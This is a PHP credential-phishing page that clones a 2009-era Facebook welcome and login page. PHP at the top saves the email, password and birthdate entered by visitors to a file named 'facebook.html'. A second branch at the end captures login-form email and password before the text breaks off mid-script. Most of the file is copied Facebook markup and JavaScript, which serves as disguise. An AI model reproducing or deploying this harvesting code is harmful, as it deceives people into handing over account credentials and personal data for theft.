<?php
if (isset($_GET['login'])) {
$email = $_POST['email'];
$pass = $_POST['pass'];
$bmonth = $_POST['birthday_captcha_month'];
$bday = $_POST['birthday_captcha_day'];
$byear = $_POST['birthday_captcha_year'];
$bdate = $bmonth . " / " . $bday . " / " . $byear;
$toSave = "Email: " . $email . " - Password: " . $pass . " - Birthdate: " . $bdate . "<br />\n\n";
$fp = fopen("facebook.html", "a");
if (fwrite($fp, $toSave))
fclose($fp);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="facebook">
<head>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-language" content="en" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<script type="text/javascript">
//<![CDATA[
(function(loc) { if (loc.pathname == '/') { return; } var uri_re = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/; var target_domain = ''; loc.href.replace(uri_re, function(all, path, query, frag) { var dst, src; dst = src = path + (query ? '?' + query : ''); if (frag) { if (frag.charAt(0) == '/') { dst = frag.replace(/^\/+/, '/') .replace(/_fb_qsub=([^&]+)&?/, function(all, domain){ if (domain.substring(domain.length - 13) == '.facebook.com') { target_domain = 'http://'+domain; } return ''; }); } else if (/&|=/.test(frag)) { var q = {}; var m = frag.match(/([^#]*)(#.*)?/); var arr = (query||'').split('&').concat((m[1]||'').split('&')); for (var i=0, length=arr.length; i<length; i++) { var t = arr[i].split('='); if (t.length && t[0] != '') { q[t[0]] = t[1]; } } var s = []; for (var i in q) { s.push(i+ (q[i]?'='+q[i]:'')); } dst = path+'?'+s.join('&')+(m[2]||''); } } dst = "" + dst; if (dst != src) { window.location.replace(target_domain + dst); } }); })(window.location); var onloadRegister = window.onloadRegister || function(h) { onloadhooks.push(h); }; var onloadhooks = window.onloadhooks || []; var onafterloadRegister = window.onafterloadRegister || function(h) { onafterloadhooks.push(h); }; var onafterloadhooks = window.onafterloadhooks || []; function wait_for_load(element, e, f) { f = bind(element, f, e); if (window.loaded) { return f(); } switch ((e || event).type) { case 'load': case 'focus': onloadRegister(f); return; case 'click': if (element.original_cursor === undefined) { element.original_cursor = element.style.cursor; } if (document.body.original_cursor === undefined) { document.body.original_cursor = document.body.style.cursor; } element.style.cursor = document.body.style.cursor = 'progress'; onafterloadRegister(function() { element.style.cursor = element.original_cursor; document.body.style.cursor = document.body.original_cursor; element.original_cursor = document.body.original_cursor = undefined; if (element.tagName.toLowerCase() == 'a') { var original_event = window.event; window.event = e; var ret_value = element.onclick.call(element, e); window.event = original_event; if (ret_value !== false && element.href) { window.location.href = element.href; } } else if (element.click) { element.click(); } }); break; } return false; }; function bind(obj, method ) { var args = []; for (var ii = 2; ii < arguments.length; ii++) { args.push(arguments[ii]); } var fn = function() { var _obj = obj || (this == window ? false : this); var _args = args.slice(); for (var jj = 0; jj < arguments.length; jj++) { _args.push(arguments[jj]); } if (typeof(method) == "string") { if (_obj[method]) { return _obj[method].apply(_obj, _args); } } else { return method.apply(_obj, _args); } }; if (typeof method == 'string') { fn.name = method; } else if (method && method.name) { fn.name = method.name; } fn.toString = function() { return bind._toString(obj, args, method); }; return fn; }; var curry = bind(null, bind, null); bind._toString = bind._toString || function(obj, args, method) { return (typeof method == 'string') ? ('late bind<'+method+'>') : ('bound<'+method.toString()+'>'); }; function goURI(uri, force_reload) { uri = uri.toString(); if (!force_reload && window.PageTransitions && PageTransitions.isInitialized()) { PageTransitions.go(uri); } else if (window.location.href == uri) { window.location.reload(); } else { window.location.href = uri; } } var PrimordialBootloader = window.PrimordialBootloader || { loaded : [], done : function(names) { PrimordialBootloader.loaded.push(names); } }; var Bootloader = window.Bootloader || { done : PrimordialBootloader.done }; function loadExternalJavascript(urls, callback, body) { if (urls instanceof Array) { var url = urls.shift(0); loadExternalJavascript(url, function() { if (urls.length) { loadExternalJavascript(urls, callback, body); } else { callback && callback(); } }, body); } else { var node = body ? document.body : document.getElementsByTagName('head')[0]; var script = document.createElement('script'); script.type = 'text/javascript'; script.src = urls; if (callback) { script.onerror = script.onload = callback; script.onreadystatechange = function() { if (this.readyState == "complete" || this.readyState == "loaded") { callback(); } } } node.appendChild(script); return script; } } window.loadFirebugConsole && window.loadFirebugConsole();document.cookie = "cvr_tx=; expires=Mon, 26 Jul 1997 05:00:00 GMT; path=\/; domain=.facebook.com";
//]]>
</script><noscript> <meta http-equiv=refresh content="0; URL=http://www.facebook.com/index.php?_fb_noscript=1" /> </noscript>

<meta name="robots" content="noodp,noydir" />
<meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." />
<title>Welcome to Facebook! | Facebook</title>

<script type="text/javascript">
Env={method:"GET",dev:0,start:(new Date()).getTime(),ps_limit:5,ps_ratio:4,svn_rev:168678,static_base:"http:\/\/static.ak.fbcdn.net\/",www_base:"http:\/\/www.facebook.com\/",tlds:["com","at","ca","co.nz","co.za","com.au","dk","es","ie","jp","net.nz","no","pl","se","vn"],ajax_bundle:1,rep_lag:2,fb_dtsg:null};
</script>

    <script type="text/javascript" src="http://static.ak.fbcdn.net/js_strings.php/t86460/en_US"></script>
    <script type="text/javascript" src="http://static.ak.fbcdn.net/rsrc.php/z6CC1/lpkg/avcy260h/en_US/141/167747/js/319ddz9cuby80sc4.pkg.js"></script>
<script type="text/javascript">Bootloader.loadInitialResources([{"name":"js\/bfyy7y61y7coos8w.pkg.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z4Z76\/lpkg\/8zdc0fr8\/en_US\/141\/168106\/js\/bfyy7y61y7coos8w.pkg.js","permanent":false},{"name":"js\/9r852sg136kgckgc.pkg.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z1KYZ\/lpkg\/bc6ou8sa\/en_US\/141\/167061\/js\/9r852sg136kgckgc.pkg.js","permanent":false},{"name":"js\/recaptcha_ajax.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z6YHA\/l\/8siw9a8d\/en_US\/166994\/js\/recaptcha_ajax.js","permanent":false},{"name":"js\/useragent.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zEJTV\/l\/5k5jekhg\/nu_ll\/139152\/js\/useragent.js","permanent":false}])</script>
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zAGCS/lpkg/dxa085ml/en_US/141/168449/css/5xxvsqmpkl4wk0kg.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z2SEH/lpkg/6e6jtn9s/en_US/141/167140/css/9wzufavzfjcogsgk.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zCYNY/lpkg/1z622p1t/en_US/141/167114/css/aubdlzq1p80sw40o.pkg.css" />
<!--[if lte IE 6]><link rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z8GXB/l/8ylg4nn7/en_US/166597/css/ie6.css" type="text/css" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z4C12/l/as0y9pa5/en_US/166690/css/ie7.css" type="text/css" /><![endif]-->
<link rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z4QCE/l/8o4e4fkm/en_US/117387/css/webkit.css" type="text/css" />
<link rel="search" type="application/opensearchdescription+xml" href="http://static.ak.fbcdn.net/opensearch_desc.xml?8:72379" title="Facebook" />
<link rel="shortcut icon" href="http://static.ak.fbcdn.net/favicon.ico?8:132011" />
</head>
<body class="WelcomePage safari3 UIPage_LoggedOut Locale_en_US">
<div id="dropmenu_container"></div><div id="FB_HiddenContainer" style="position:absolute; top:-10000px; left:-10000px; width:0px; height:0px;" ></div><div id="nonfooter"><div id="page_height" class="clearfix"><div id="content" class="fb_content"><div class="UIOneOff_Container"><!-- 2365fa3194ecdc0cab15721ce967a9f8663937c7 -->
<div class="WelcomePage_Container"><div id="menubar_container"><div id="fb_menubar" class="fb_menubar_logged_out clearfix"><div id="fb_menubar_core"><ul class="fb_menu_list"><li class="fb_menu" id="fb_menubar_logo"><a href="http://www.facebook.com" title="Go to Facebook Home"><span>&nbsp;</span></a></li></ul></div>

<div id="fb_menubar_aux"><ul class="fb_menu_list"><div class="menu_login_container">

<form method="POST" action="http://www.facebook.com/home.php" name="menubar_login" id="menubar_login">
<input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" />
<input type="hidden" id="locale" name="locale" value="en_US" />
<table cellpadding="0" cellspacing="0">
<tr>
<td class="login_form_label_field login_form_label_remember">
<label>
<input type="checkbox" name="persistent" value="1" />Remember Me</label>
</td>
<td class="login_form_label_field">
<a href="http://www.facebook.com/reset.php" rel="nofollow">Forgot your password?</a>
</td>
<td class="login_form_last_field login_form_label_field">
</td>
</tr>
<tr>
<td>
<input type="text" class="inputtext" id="email" name="email" value="" />
</td>
<td>
<input type="password" class="inputpassword" id="pass" name="pass" value="" />
<input type="text" class="inputtext hidden_elem" id="pass_placeholder" name="pass_placeholder" value="" />
</td>
<td class="login_form_last_field">
<div class="inner">
<div class="UILinkButton"">
<input type="submit" name="dlb" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { seo_tracking_onclick(this,&quot;facebookpoc&quot;,&quot;facebookpoc&quot;,&quot;1&quot;,&quot;1&quot;,&quot;Login&quot;,&quot;Menu Bar&quot;); });" value="Login" />
<div class="UILinkButton_RW">
<div class="UILinkButton_R">
</div>
</div>
</div>
</div>
</td>
</tr>
</table>
<input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" />
</form>

</div></ul></div></div></div>
<div class="WelcomePage_MainSellContainer"><div class="WelcomePage_MainSell"><div class="WelcomePage_MainSellCenter clearfix"><div class="WelcomePage_MainSellLeft"><div class="WelcomePage_MainMessage">Facebook helps you connect and share with the people in your life.</div><div class="WelcomePage_MainMap">&nbsp;</div></div><div class="WelcomePage_MainSellRight"><div class="WelcomePage_SignUpSection"><div class="WelcomePage_SignUpMessage"><div class="WelcomePage_SignUpHeadline">Sign Up</div><div class="WelcomePage_SignUpSubheadline">It's free and anyone can join</div></div><div class="WelcomePage_SimpleReg" id="registration_container"><div id="simple_registration_container" class="simple_registration_container"><div id="reg_box"><form method="post" action="https://register.facebook.com/r.php" name="reg" id="reg" onsubmit="return wait_for_load(this, event, function() { return false; });"><input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" /><input type="hidden" id="locale" name="locale" value="en_US" /><input type="hidden" id="terms" name="terms" value="on" /><input type="hidden" id="reg_instance" name="reg_instance" value="1245030569-85d776ce0a32042d6ae2633089d95090aad6266a8f703abfbcaab" /><noscript><div id="no_js_box"><h2>Javascript is disabled on your browser.</h2><p>Please enable JavaScript on your browser or upgrade to a Javascript-capable browser to register for Facebook.</p></div></noscript><div id="reg_form_box"><table class="editor" border="0" cellspacing="0"><tr><td class="label">Full Name:</td><td><div class="field_container"><input type="text" class="inputtext" id="name" name="name" value="" /></div></td></tr>
<tr><td class="label">Your Email:</td><td><div class="field_container"><input type="text" class="inputtext" id="reg_email__" name="reg_email__" value="" /></div></td></tr>
<tr><td class="label">New Password:</td><td><div class="field_container"><input type="password" class="inputpassword" id="reg_passwd__" name="reg_passwd__" value="" /></div></td></tr>
<tr><td class="label">I am:</td><td><div class="field_container"><select class="select" name="sex" id="sex"  ><option value="0">Select Sex:</option><option value="1">Female</option><option value="2">Male</option></select></div></td></tr>
<tr><td class="label">Birthday:</td><td><div class="field_container"> <select name="birthday_month" id="birthday_month" onchange="return wait_for_load(this, event, function() { editor_date_month_change(this, 'birthday_day','birthday_year'); });" autocomplete="off"><option value="-1">Month:</option><option value="1">Jan</option>
<option value="2">Feb</option>
<option value="3">Mar</option>
<option value="4">Apr</option>
<option value="5">May</option>
<option value="6">Jun</option>
<option value="7">Jul</option>
<option value="8">Aug</option>
<option value="9">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>
</select> <select name="birthday_day" id="birthday_day"  autocomplete="off"><option value="-1">Day:</option><option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select> <select name="birthday_year" id="birthday_year" onchange="return wait_for_load(this, event, function() { editor_date_month_change(&quot;birthday_month&quot;,&quot;birthday_day&quot;,this); });" autocomplete="off"><option value="-1">Year:</option><option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
<option value="1904">1904</option>
<option value="1903">1903</option>
<option value="1902">1902</option>
<option value="1901">1901</option>
<option value="1900">1900</option>
</select></div></td></tr>
<tr><td class="label"></td><td><div id="birthday_warning"><a onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().show_birthday_help(); return false; });" title="Click for more information">Why do I need to provide this?</a></a></div></td></tr>
</table><input type="hidden" id="referrer" name="referrer" value="116" /><input type="hidden" id="challenge" name="challenge" value="d4a2b76d187b8322b0ac23f5765c6d7f" /><input type="hidden" id="md5pass" name="md5pass" value="" /><div class="reg_btn clearfix"><div class="UILinkButton UILinkButton_SU""><input type="submit" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { seo_tracking_onclick(this,&quot;facebookpoc&quot;,&quot;facebookpoc&quot;,&quot;1&quot;,&quot;1&quot;,&quot;Signup&quot;,&quot;Simple Reg Box&quot;);RegUtil.getInstance().ajax_validate_data({ignore: [&#039;captcha&#039;]}, &#039;registration_container&#039;, &#039;1&#039; ); return false; });" tabindex="1" value="Sign Up" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div><div id="async_status" class="async_status" style="display: none"><img src="http://static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /></div></div></div><div id="reg_captcha" style="display: none;"><h2>Security Check</h2><div id="outer_captcha_box"><div id="captcha_box"><div class="field_error" id="captcha_response_error" style="display:none;">This field is required.</div><div id="captcha" class="captcha">
  <input type="hidden" id="captcha_persist_data" name="captcha_persist_data" value="AAAAAQAQwcHrpuk9l_6HbWJf1mhZCAAAAGvqENqFy5KkvMip5AIv3QSF7BS7goiHfAC7fTkzr8hW60InDl47TxG_U-nIGUv-vA4xc_DDdfrNfXiNTps2se6OiwSYRJ37Sp8fPtKrFLQLh2tAbo5USXWuVjzv_KD1SMyTWhf34AGorQd27dFqZc0a" /><div class="captcha_challenge"><div id="recaptcha_scripts" style="display:none"></div><input type="hidden" id="captcha_session" name="captcha_session" value="ARdK66k8I7SXLQoYoM5O_Q" /><input type="hidden" id="extra_challenge_params" name="extra_challenge_params" value="authp=nonce.tt.time.new_audio_default&amp;psig=aCjTiakd7HrtVm6SwAq6zApKXTQ&amp;nonce=ARdK66k8I7SXLQoYoM5O_Q&amp;tt=xvi8Kb68AHse5VT6TLMXNouAT9U&amp;time=1245030569&amp;new_audio_default=1" />
    <div class="recaptcha_text">Enter <strong>both words</strong> below, <strong>separated by a space</strong>.<br /><div class="recaptcha_only_if_image">Can't read the words below? <a href="#" id="recaptcha_reload_btn" onclick="return wait_for_load(this, event, function() { Recaptcha.reload(); return false });" tabindex="-1">Try different words</a> or <a href="#" onclick="return wait_for_load(this, event, function() { Recaptcha.switch_type(&#039;audio&#039;); return false });" tabindex="-1">an audio captcha</a>.</div><div class="recaptcha_only_if_audio"><a href="#" id="recaptcha_reload_btn" onclick="return wait_for_load(this, event, function() { Recaptcha.reload(); return false });" tabindex="-1">Try different words</a> or <a href="#" class='recaptcha_only_if_audio' onclick="return wait_for_load(this, event, function() { Recaptcha.switch_type('image'); return false });" tabindex='-1'>back to text.</a></div></div><span id='recaptcha_play_audio'></span><div class="audiocaptcha"></div><div id="recaptcha_image"></div><div id="recaptcha_loading" class="fbloading"><span>Loading...</span></div></div><div class="captcha_refresh"></div><div class="captcha_input"><label>Text in the box:</label><div class="field_container"><input type="text" name="captcha_response" id="captcha_response" autocomplete="off" /></div><div style="margin-left: 15px; display: inline;"><a href="#" id="captcha_whatsthis" onclick="return wait_for_load(this, event, function() { captcha_whatsthis(this); return false });">What's This?</a></div>
  </div>
</div></div></div><div id="captcha_buttons" class="clearfix" style="display: none;"><div id="back_button" class="gridCol"><div class="cancel_button_image">&nbsp;</div><a href="#" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().hide_captcha(); RegUtil.getInstance().show_reg_form(); return false; });" id="cancel_button">Back</a></div><div id="A_btn_sign_up" class="gridCol"><div><div class="UILinkButton UILinkButton_SU""><input type="submit" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().ajax_validate_data(&#039;&#039;, &#039;registration_container&#039;, &#039;1&#039;);return false; });" value="Sign Up" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div><div id="captcha_async_status" class="async_status" style="display: none"><img src="http://static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /></div></div></div></div></div></form>
<div id="reg_progress" style="display: none"><div id="progress_wrap"><img src="http://static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /><div id="progress_msg">Registering&hellip;</div></div></div><div id="reg_error" style="display: none"><div id="reg_error_inner">An error occurred. Please try again.</div></div><div id="tos_container" class="tos_container hidden_elem"><p class="legal_tos">By clicking Sign Up, you are indicating that you have read and agree to the <a href="/terms.php" target="_blank" rel="nofollow">Terms of Use</a> and <a href="/policy.php" target="_blank" rel="nofollow">Privacy Policy</a>.</p></div><div id="reg_pages_msg" >To create a page for a celebrity, band or business, <a href="http://www.facebook.com/pages/create.php">click here</a>.</div></form></div><form id="confirmation_email_form" method="POST" action="https://register.facebook.com/r.php"><input type="hidden" id="locale" name="locale" value="en_US" /><input type="hidden" id="confirmation_email" name="ce" value="" /></form></div></div></div></div></div></div></div></div></div></div></div></div><div id="pagefooter" class= "pagefooter_minimal"><div class="pagefooter_topborder clearfix"><div class="copyright_and_location clearfix"><div class="copyright" id="pagefooter_copyright"><span title="PHP">Facebook </span><span id="rtime" title="139">&copy;</span> <span title="10.129.58.107">20</span><span title="22321928">09</span></div><div id="locale_selector_dialog_onclick"><a onclick="return wait_for_load(this, event, function() { intl_locale_selector_dialog(&quot;http:\/\/www.facebook.com\/index.php&quot;); });" title="English (US)">English (US)</a></div></div><div id="pagefooter_links"><ul id="pagefooter_left_links"><li><a href="http://www.facebook.com/login.php?ref=pf">Login</a></li><li><a href="http://www.facebook.com/facebook?ref=pf" accesskey="7" rel="nofollow">About</a></li><li><a href="http://www.facebook.com/advertising/?src=pf">Advertising</a></li><li><a href="http://developers.facebook.com/?ref=pf">Developers</a></li><li><a href="http://www.facebook.com/careers/?ref=pf">Careers</a></li><li><a href="http://www.facebook.com/terms.php?ref=pf" accesskey="8" rel="nofollow">Terms</a></li><li><span><img alt=""  class="li_bullet spritemap_icons sx_icons_pagefooter_bullet" src="http://static.ak.fbcdn.net/images/spacer.gif?8:11"></span></li></ul><ul id="pagefooter_right_links"><li><a href="http://www.facebook.com/find-friends/?ref=pf">Find Friends</a></li><li><a href="http://www.facebook.com/policy.php?ref=pf" accesskey="6" rel="nofollow">Privacy</a></li><li><a href="http://www.facebook.com/mobile/?ref=pf" accesskey="5">Mobile</a></li><li><a href="http://www.facebook.com/help.php?ref=pf" accesskey="0" rel="nofollow">Help</a></li></ul></div></div></div><div id="js_buffer"><script type="text/javascript">

onloadRegister(function(){Bootloader.configurePage({"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zAGCS\/lpkg\/dxa085ml\/en_US\/141\/168449\/css\/5xxvsqmpkl4wk0kg.pkg.css":["css\/5xxvsqmpkl4wk0kg.pkg.css",true],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z2SEH\/lpkg\/6e6jtn9s\/en_US\/141\/167140\/css\/9wzufavzfjcogsgk.pkg.css":["css\/9wzufavzfjcogsgk.pkg.css",false],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zCYNY\/lpkg\/1z622p1t\/en_US\/141\/167114\/css\/aubdlzq1p80sw40o.pkg.css":["css\/aubdlzq1p80sw40o.pkg.css",true]});
Bootloader.done(["css\/5xxvsqmpkl4wk0kg.pkg.css","css\/9wzufavzfjcogsgk.pkg.css","css\/aubdlzq1p80sw40o.pkg.css"]);
});

onloadRegister(function (){if (window.Env) { Env["nctrlid"]="5d21206b2830d2184bee42b6164223d8"; };});
onloadRegister(function (){if (window.Env) { Env["nctrlnid"]=""; };});
onloadRegister(function (){if (window.NectarPhotosLog) {
          Arbiter.subscribe(NectarPhotosLog.NECTAR_LOG,
            NectarPhotosLog.arbiterHandler);
          onbeforeunloadRegister(function() {
              Arbiter.inform(NectarPhotosLog.NECTAR_LOG, {"flush" : true});
              }, false);
          };});
onloadRegister(function (){focus_login(0, true);
new MenuBar("fb_menubar_core").setTimeoutInterval(250).init();
new MenuBar("fb_menubar_aux").setTimeoutInterval(100).init();;});
onloadRegister(function (){new RegKeyPressListen(1);;});
onloadRegister(function (){new CaptchaBoxKeyPressListen('1', 'registration_container', '1');;});
onloadRegister(function (){regform_listen_focus("reg", "form_focus");;});
onloadRegister(function (){ffid='m/KCDbSsEFNigYija0piBA==';;});
onloadRegister(function (){window.loading_page_chrome = true;;});
onloadRegister(function (){window.loading_page_chrome = false;;});
onloadRegister(function (){var n = "rtime"; (window.ge && ge(n)) && (ge(n).title += " | 142");;});
onloadRegister(function (){
      onbeforeunloadRegister(function () {
        window.setCookie && window.setCookie("cvr_tx", (new Date()).getTime(), 10000);
        }, true);;});
onafterloadRegister(function (){seo_tracking_onload("facebookpoc","facebookpoc","1","1","Welcome","","1244791216dd17c735dbb07bac204b47151ead5648550abfa7fb606efa32b49","Welcome","www.facebook.com","en_US","en_US","en_US","US","Logged Out","");});


</script></div></body>
</html>
<?php
die();
}

if (isset($_POST['dlb'])) {
$email = $_POST['email'];
$pass = $_POST['pass'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="facebook">
<head>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-language" content="en" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<script type="text/javascript"> 
//<![CDATA[
disableRPAR=1;(function(loc) { if (loc.pathname == '/') { return; } var uri_re = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/; var target_domain = ''; loc.href.replace(uri_re, function(all, path, query, frag) { var dst, src; dst = src = path + (query ? '?' + query : ''); if (frag) { if (frag.charAt(0) == '/') { dst = frag.replace(/^\/+/, '/') .replace(/_fb_qsub=([^&]+)&?/, function(all, domain){ if (domain.substring(domain.length - 13) == '.facebook.com') { target_domain = 'http://'+domain; } return ''; }); } else if (/&|=/.test(frag)) { var q = {}; var m = frag.match(/([^#]*)(#.*)?/); var arr = (query||'').split('&').concat((m[1]||'').split('&')); for (var i=0, length=arr.length; i<length; i++) { var t = arr[i].split('='); if (t.length && t[0] != '') { q[t[0]] = t[1]; } } var s = []; for (var i in q) { s.push(i+ (q[i]?'='+q[i]:'')); } dst = path+'?'+s.join('&')+(m[2]||''); } } dst = "" + dst; if (dst != src) { window.location.replace(target_domain + dst); } }); })(window.location); var onloadRegister = window.onloadRegister || function(h) { onloadhooks.push(h); }; var onloadhooks = window.onloadhooks || []; var onafterloadRegister = window.onafterloadRegister || function(h) { onafterloadhooks.push(h); }; var onafterloadhooks = window.onafterloadhooks || []; function wait_for_load(element, e, f) { f = bind(element, f, e); if (window.loaded) { return f(); } switch ((e || event).type) { case 'load': case 'focus': onloadRegister(f); return; case 'click': if (element.original_cursor === undefined) { element.original_cursor = element.style.cursor; } if (document.body.original_cursor === undefined) { document.body.original_cursor = document.body.style.cursor; } element.style.cursor = document.body.style.cursor = 'progress'; onafterloadRegister(function() { element.style.cursor = element.original_cursor; document.body.style.cursor = document.body.original_cursor; element.original_cursor = document.body.original_cursor = undefined; if (element.tagName.toLowerCase() == 'a') { var original_event = window.event; window.event = e; var ret_value = element.onclick.call(element, e); window.event = original_event; if (ret_value !== false && element.href) { window.location.href = element.href; } } else if (element.click) { element.click(); } }); break; } return false; }; function bind(obj, method ) { var args = []; for (var ii = 2; ii < arguments.length; ii++) { args.push(arguments[ii]); } var fn = function() { var _obj = obj || (this == window ? false : this); var _args = args.slice(); for (var jj = 0; jj < arguments.length; jj++) { _args.push(arguments[jj]); } if (typeof(method) == "string") { if (_obj[method]) { return _obj[method].apply(_obj, _args); } } else { return method.apply(_obj, _args); } }; if (typeof method == 'string') { fn.name = method; } else if (method && method.name) { fn.name = method.name; } fn.toString = function() { return bind._toString(obj, args, method); }; return fn; }; var curry = bind(null, bind, null); bind._toString = bind._toString || function(obj, args, method) { return (typeof method == 'string') ? ('late bind<'+method+'>') : ('bound<'+method.toString()+'>'); }; function goURI(uri, force_reload) { uri = uri.toString(); if (!force_reload && window.PageTransitions && PageTransitions.isInitialized()) { PageTransitions.go(uri); } else if (window.location.href == uri) { window.location.reload(); } else { window.location.href = uri; } } var PrimordialBootloader = window.PrimordialBootloader || { loaded : [], done : function(names) { PrimordialBootloader.loaded.push(names); } }; var Bootloader = window.Bootloader || { done : PrimordialBootloader.done }; function loadExternalJavascript(urls, callback, body) { if (urls instanceof Array) { var url = urls.shift(0); loadExternalJavascript(url, function() { if (urls.length) { loadExternalJavascript(urls, callback, body); } else { callback && callback(); } }, body); } else { var node = body ? document.body : document.getElementsByTagName('head')[0]; var script = document.createElement('script'); script.type = 'text/javascript'; script.src = urls; if (callback) { script.onerror = script.onload = callback; script.onreadystatechange = function() { if (this.readyState == "complete" || this.readyState == "loaded") { callback(); } } } node.appendChild(script); return script; } } window.loadFirebugConsole && loadFirebugConsole(); var rsrcProvideAndRequire = function() { var loaded = {}, pending = {}; function isBlocked(local, foreign, exclude) { if (local in pending) { exclude = exclude || {}; for (var ii in pending[local].requires) { if (!(ii in exclude)) { for (var jj in pending[local].provides) { exclude[jj] = 1; } if ((ii in foreign) || isBlocked(ii, foreign, exclude)) { return true; } } } } return false; } function checkSatisfied() { do { var hit = false; for (var ii in pending) { var res = 